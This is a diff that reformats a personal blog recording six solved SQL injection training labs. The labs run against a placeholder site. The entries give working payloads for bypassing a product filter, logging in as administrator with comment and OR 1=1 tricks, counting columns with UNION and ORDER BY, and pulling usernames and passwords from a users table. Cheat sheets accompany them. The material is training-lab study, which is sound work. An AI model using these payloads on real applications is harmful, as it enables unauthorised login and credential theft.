@@ -1,144 +1,153 @@
-This blog documents my daily learning progress through practical SQL Injection labs. The exercises below demonstrate various SQL Injection techniques used to exploit common vulnerabilities in web applications. Each lab includes context, objectives, methods used, and successful payloads.
-
 # Lab 1 - Retrieving Hidden Data via SQL Injection
-Lab Description:
-This lab contains a SQL injection vulnerability in the product category filter. The SQL query used is:
+
+*Lab:* SQL Injection Vulnerability allows retrieving hidden data  
+*Status:* Solved  
+*Target:* Display unreleased products via SQL Injection
+
+# Lab Context
+
+The lab contains a SQL injection vulnerability in the product category filter. Query structure:
 
 sql
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
-Objective:
-Exploit the SQL injection vulnerability to retrieve unreleased products from the database.
 
-Solution Strategy:
-By injecting a comment to bypass the released = 1 condition:
 
-arduino
+# Goal
+
+-  Exploit SQL Injection to bypass filter and display unreleased products.
+
+# Basic Injection Strategy
+
+Use:
 https://insecure-website.com/products?category=Gifts'--
-This modifies the query to:
+
+Which turns the query into:
 
 sql
 SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
-Using a Boolean-based condition:
 
-arduino
+# OR-Based Bypass
+
 https://insecure-website.com/products?category=Gifts'+OR+1=1--
-This ensures the query always returns true and displays all products, including unreleased ones.
+
+# Injection Cheat Sheet
+
+| Type        | Payload     | Effect                      |
+|-------------|-------------|-----------------------------|
+| Comment     | '--       | Comments out the query      |
+| Boolean OR  | ' OR 1=1--| Bypasses condition check    |
+
 
 # Lab 2 - Login Bypass via SQL Injection
-Lab Description:
-The lab simulates a login form vulnerable to SQL injection.
 
-Objective:
-Bypass the authentication mechanism to log in as the administrator.
+*Lab:* SQL Injection Vulnerability Allowing Login Bypass  
+*Status:* Solved  
+*Target:* Log in as administrator by bypassing authentication
 
-Exploitation Example:
+# Attack Example
 
-Injecting in the username field:
+Payload for username:
 
-vbnet
-Username: administrator'--
-This changes the SQL query to:
+sql
+administrator'--
+
+Backend transforms to:
 
 sql
 SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
-Alternatively, using a Boolean-based payload:
 
-vbnet
-Username: administrator  
-Password: ' OR 1=1 --
+Also possible:
 
-# Lab 3 - Determining the Number of Columns via UNION
-Lab Description:
-The lab requires using the UNION SQL operator to determine how many columns exist in the original query.
+- Username: administrator
+- Password: ' OR 1=1 --
 
-Objective:
-Discover the number of columns in the result set to proceed with further UNION-based attacks.
+# Lab 3 - Determining Number of Columns via UNION
 
-Methods Used:
+*Lab:* SQL injection UNION attack, determining the number of columns  
+*Status:* Solved  
+*Target:* Discover column count using UNION
 
-Using ORDER BY clause to find the column count:
+# Techniques
 
-pgsql
-' ORDER BY 1--
-' ORDER BY 3--
-Increase the number until an error is returned.
+- Try increasing NULLs:
+  
+  '+UNION+SELECT+NULL--  
+  '+UNION+SELECT+NULL,NULL--  
+  
+- Use ORDER BY:
+  
+  ' ORDER BY 1--  
+  ' ORDER BY 3--   
 
-Using UNION with NULL values:
 
-sql
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-Gradually increase the number of NULL values until no error is thrown, indicating a match with the number of columns.
+# Lab 4 - Finding Text-Compatible Column
 
-# Lab 4 - Finding a Text-Compatible Column
-Lab Description:
-This lab requires identifying which columns can hold text values to display extracted data.
+*Lab:* SQL injection UNION attack to find text column  
+*Status:* Solved  
+*Target:* Leak usernames/passwords
 
-Objective:
-Determine which column can be used to extract and display usernames or passwords.
+# Steps
 
-Steps:
+1. Determine columns:  
+   
+   '+UNION+SELECT+NULL,NULL-- 
+   
+2. Find text support:  
+   
+   '+UNION+SELECT+'abc',NULL--  
+   '+UNION+SELECT+NULL,'abc'--    
 
-Identify column count:
+3. Final payload:
+   
+   '+UNION+SELECT+NULL,username||'*'||password+FROM+users--
+   
 
-vbnet
-' UNION SELECT NULL,NULL--
-Check which column supports text:
+# Lab 5 - Retrieve Data From Other Tables
 
-sql
-' UNION SELECT 'abc',NULL--
-' UNION SELECT NULL,'abc'--
-Extract data:
+*Lab:* SQL injection UNION attack, retrieving data from other tables  
+*Status:* Solved  
+*Target:* Extract usernames/passwords from users table
 
-bash
-' UNION SELECT NULL,username||'*'||password FROM users--
+# Process
 
-# Lab 5 - Retrieving Data from Other Tables
-Lab Description:
-This lab focuses on using UNION to retrieve information from unrelated tables in the database.
+1. Columns count:  
+   
+   ' UNION SELECT NULL,NULL-- 
+   
+2. Find text columns:  
+   
+   ' UNION SELECT 'abc','def'--  
 
-Objective:
-Extract username and password from the users table.
+3. Final payload:  
+   
+   ' UNION SELECT username, password FROM users-- 
 
-Steps Followed:
 
-Determine the number of columns:
+# Lab 6 - Retrieve Multiple Values in One Column
 
-vbnet
-' UNION SELECT NULL,NULL--
-Verify columns can hold text:
+*Lab:* SQL injection UNION attack with string concatenation  
+*Status:* Solved  
+*Target:* Extract usernames/passwords into a single column
 
-bash
-' UNION SELECT 'abc','def'--
-Final data extraction payload:
+# Process
 
-vbnet
-' UNION SELECT username, password FROM users--
+1. Check text column:
+   
+   '+UNION+SELECT+NULL,'abc'-- 
 
-# Lab 6 - Retrieve Multiple Values in a Single Column
-Lab Description:
-This lab involves using string concatenation to combine and extract multiple values into one output column.
+2. Combine data:
+   
+   '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 
-Objective:
-Concatenate username and password and display them in a single result field.
+   
+# String Concatenation Cheats
 
-Steps Taken:
-
-Identify the text-compatible column:
-
-bash
-' UNION SELECT NULL,'abc'--
-Use concatenation to extract data:
-
-bash
-' UNION SELECT NULL,username||'~'||password FROM users--
-String Concatenation Reference Table:
-
-Database	Concatenation Syntax
-Oracle	`'a'
-PostgreSQL	`'a'
-MySQL	CONCAT('a','b')
-SQL Server	'a' + 'b'
+| DBMS        | Syntax                        |
+|-------------|-------------------------------|
+| Oracle      | 'a'||'b'                    |
+| PostgreSQL  | 'a'||'b'                    |
+| MySQL       | CONCAT('a','b')             |
+| Microsoft   | 'a' + 'b'                   |
 
 Each of these labs provided a strong foundation for understanding SQL injection techniques and how to exploit and mitigate such vulnerabilities in real-world applications.
 
